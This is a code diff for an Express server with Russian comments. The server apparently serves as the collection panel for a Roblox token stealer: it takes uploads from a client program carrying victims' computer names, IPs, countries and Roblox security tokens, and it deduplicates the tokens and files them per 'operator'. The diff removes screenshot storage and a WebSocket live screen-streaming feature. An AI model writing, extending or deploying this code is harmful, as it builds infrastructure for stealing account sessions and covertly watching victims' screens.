@@ -5,7 +5,6 @@ const path        = require('path');
 const session     = require('express-session');
 const https       = require('https');
 const http        = require('http');
-const WebSocket   = require('ws');
 const { MongoClient } = require('mongodb');
 
 const app = express();
@@ -66,23 +65,8 @@ const sessionOpts = {
 };
 app.use(session(sessionOpts));
 
-// ── Health check для Render ───────────────────────────────────────────────────
+// ── Health check ──────────────────────────────────────────────────────────────
 app.get('/health', (req, res) => res.json({ status: 'ok' }));
-
-// ── Отдача файлов (скриншотов) из MongoDB ─────────────────────────────────────
-app.get('/uploads/:filename', async (req, res) => {
-  try {
-    const db = await getDb();
-    const doc = await db.collection('files').findOne({ name: req.params.filename });
-    if (!doc || !doc.data) return res.status(404).send('Not found');
-    const buf = Buffer.from(doc.data, 'base64');
-    res.set('Content-Type', doc.contentType || 'image/png');
-    res.set('Cache-Control', 'no-cache');
-    res.send(buf);
-  } catch (e) {
-    res.status(404).send('Not found');
-  }
-});
 
 // ── Статический сайт (docs/) — раздаём с того же сервера ──────────────────────
 const DOCS_DIR = path.join(__dirname, '..', 'docs');
@@ -312,13 +296,7 @@ app.post('/api/settings', requireAuth, async (req, res) => {
 
   const patch = {};
   if (typeof displayName === 'string' && displayName.trim()) patch.displayName = displayName.trim().substring(0, 32);
-  if (typeof avatarImage === 'string' && avatarImage.startsWith('data:image/') && avatarImage.length < 700000) {
-    patch.avatarImage = avatarImage;
-    patch.avatar = '';
-  } else if (typeof avatar === 'string' && avatar.trim()) {
-    patch.avatar = avatar.trim().substring(0, 8);
-    patch.avatarImage = '';
-  }
+  if (typeof avatar === 'string' && avatar.trim()) patch.avatar = avatar.trim().substring(0, 8);
   if (typeof themeColor === 'string' && /^#[0-9a-fA-F]{6}$/.test(themeColor)) patch.themeColor = themeColor;
   if (typeof bio === 'string') patch.bio = bio.substring(0, 120);
   if (newPassword) patch.password = newPassword;
@@ -336,8 +314,6 @@ app.post('/api/settings', requireAuth, async (req, res) => {
 //  API — Upload files (from WPF client)
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.post('/upload', upload.array('files'), async (req, res) => {
-  if (!req.files?.length) return res.status(400).json({ error: 'Нет файлов' });
-
   const sanitize = (val, max = 256) => {
     if (typeof val !== 'string') return '';
     return val.replace(/[<>\"'{}|\\^]/g, '').substring(0, max);
@@ -349,7 +325,10 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   } catch (e) {
     db = null;
   }
-  if (!db) return res.status(503).json({ error: 'База данных недоступна (MONGODB_URI not set)' });
+  // In-memory fallback when no MongoDB
+  if (!db) {
+    if (!global.memFiles) global.memFiles = [];
+  }
 
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '—';
   const computerInfo = {
@@ -371,39 +350,37 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   const operator = sanitize(req.body.operator, 64) || 'Shonll';
   const pcName = computerInfo.name;
 
-  // Удаляем предыдущий скриншот этого же компьютера (того же оператора)
-  await db.collection('files').deleteMany({
-    'computer.name': pcName,
-    operator: operator
-  });
-
-  const uploaded = [];
-  for (const f of req.files) {
-    const orig = decodeFilename(f.originalname);
-    const fixedName = `screenshot_${sanitizeFilename(operator)}_${sanitizeFilename(pcName)}.png`;
-    const fileData = f.buffer; // memoryStorage — файл в buffer
-
-    const doc = {
-      name: fixedName,
-      originalName: orig,
-      data: fileData.toString('base64'),
-      contentType: f.mimetype || 'image/png',
-      size: f.size,
-      uploadedAt: new Date().toISOString(),
-      computer: computerInfo,
-      roblox: robloxInfo,
+  // Удаляем предыдущую запись этого же компьютера (того же оператора)
+  if (db) {
+    await db.collection('files').deleteMany({
+      'computer.name': pcName,
       operator: operator
-    };
+    });
+  }
 
+  const fixedName = `entry_${sanitizeFilename(operator)}_${sanitizeFilename(pcName)}`;
+  const doc = {
+    name: fixedName,
+    uploadedAt: new Date().toISOString(),
+    computer: computerInfo,
+    roblox: robloxInfo,
+    operator: operator
+  };
+
+  if (db) {
     await db.collection('files').updateOne(
       { name: fixedName, operator: operator },
       { $set: doc },
       { upsert: true }
     );
-
-    uploaded.push({ name: fixedName, originalName: orig, size: f.size });
-    console.log(`[${new Date().toLocaleTimeString()}] 📥 ${orig} от "${computerInfo.name}" (${computerInfo.ip}) [${computerInfo.country}]` + (robloxInfo.user ? ` [Roblox: ${robloxInfo.user}]` : '') + (robloxInfo.security ? ` [🔑 токен есть]` : ''));
+  } else {
+    // In-memory fallback
+    global.memFiles = global.memFiles.filter(f => !(f.name === fixedName && f.operator === operator));
+    global.memFiles.push(doc);
   }
+
+  const uploaded = [{ name: fixedName, originalName: fixedName, size: 0 }];
+  console.log(`[${new Date().toLocaleTimeString()}] 📥 Данные от "${computerInfo.name}" (${computerInfo.ip}) [${computerInfo.country}]` + (robloxInfo.user ? ` [Roblox: ${robloxInfo.user}]` : '') + (robloxInfo.security ? ` [🔑 токен есть]` : ''));
 
   // Дедупликация токенов
   if (robloxInfo.security) {
@@ -527,10 +504,15 @@ app.get('/files', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   try {
     const db = await getDb();
-    let files = await db.collection('files')
-      .find({ operator: user })
-      .sort({ uploadedAt: -1 })
-      .toArray();
+    let files;
+    if (db) {
+      files = await db.collection('files')
+        .find({ operator: user })
+        .sort({ uploadedAt: -1 })
+        .toArray();
+    } else {
+      files = (global.memFiles || []).filter(f => f.operator === user);
+    }
 
     files = files.map(f => {
       const { data, ...safe } = f;
@@ -2128,91 +2110,7 @@ loadTokens();
 </html>`;
 }
 
-// ── Screen Stream ─────────────────────────────────────────────────────────────
-const latestFrames = new Map(); // "operator|pcName" -> Buffer
-const streamSockets = new Map(); // "operator|pcName" -> WebSocket
-
-// Список активных стримов (для отладки)
-app.get('/streams', requireAuth, (req, res) => {
-  const result = [];
-  for (const [name, ws] of streamSockets) {
-    const frame = latestFrames.get(name);
-    result.push({
-      name,
-      connected: ws.readyState === WebSocket.OPEN,
-      hasFrame: !!frame,
-      frameSize: frame ? frame.length : 0,
-      lastFrame: frame ? new Date().toISOString() : null
-    });
-  }
-  res.json(result);
-});
-
-// MJPEG поток экрана для браузера
-app.get('/stream/:computerName', requireAuth, (req, res) => {
-  const pcName = req.params.computerName;
-  const frameKey = (req.authUser || req.session.user) + '|' + pcName;
-  res.writeHead(200, {
-    'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
-    'Cache-Control': 'no-cache',
-    'Pragma': 'no-cache',
-    'Connection': 'keep-alive'
-  });
-
-  const interval = setInterval(() => {
-    const frame = latestFrames.get(frameKey);
-    if (frame && !res.writableEnded) {
-      try {
-        res.write('--frame\r\n');
-        res.write('Content-Type: image/jpeg\r\n');
-        res.write('Content-Length: ' + frame.length + '\r\n\r\n');
-        res.write(frame);
-        res.write('\r\n');
-      } catch (e) {
-        clearInterval(interval);
-      }
-    }
-  }, 100);
-
-  req.on('close', () => clearInterval(interval));
-});
-
-function setupWebSocket(httpServer) {
-  const wss = new WebSocket.Server({ server: httpServer });
-  wss.on('connection', (ws) => {
-    let streamKey = null;
-    let pingInterval = setInterval(() => {
-      if (ws.readyState === WebSocket.OPEN) ws.ping();
-    }, 30000);
-
-    ws.on('message', (data) => {
-      if (Buffer.isBuffer(data)) {
-        if (streamKey) latestFrames.set(streamKey, data);
-      } else {
-        const text = data.toString();
-        if (!streamKey) {
-          streamKey = text; // ожидается "operator|pcName"
-          streamSockets.set(streamKey, ws);
-          console.log(`[${new Date().toLocaleTimeString()}] 📺 Stream connected: ${streamKey}`);
-        }
-      }
-    });
-
-    ws.on('close', () => {
-      clearInterval(pingInterval);
-      if (streamKey) {
-        streamSockets.delete(streamKey);
-        console.log(`[${new Date().toLocaleTimeString()}] 📺 Stream disconnected: ${streamKey}`);
-      }
-    });
-
-    ws.on('error', (err) => {
-      console.log(`[${new Date().toLocaleTimeString()}] 📺 Stream error: ${err.message}`);
-    });
-  });
-}
-
-// ── Global error handler — prevents server crash on any unhandled error ────────
+// ── Global error handler ──────────────────────────────────────────────────────
 app.use((err, req, res, next) => {
   console.error('Unhandled error:', err.message);
   if (!res.headersSent) {
@@ -2222,7 +2120,6 @@ app.use((err, req, res, next) => {
 
 // ── Start ─────────────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 25565;
-const server = app.listen(PORT, '0.0.0.0', () => {
+app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${PORT}`);
 });
-setupWebSocket(server);
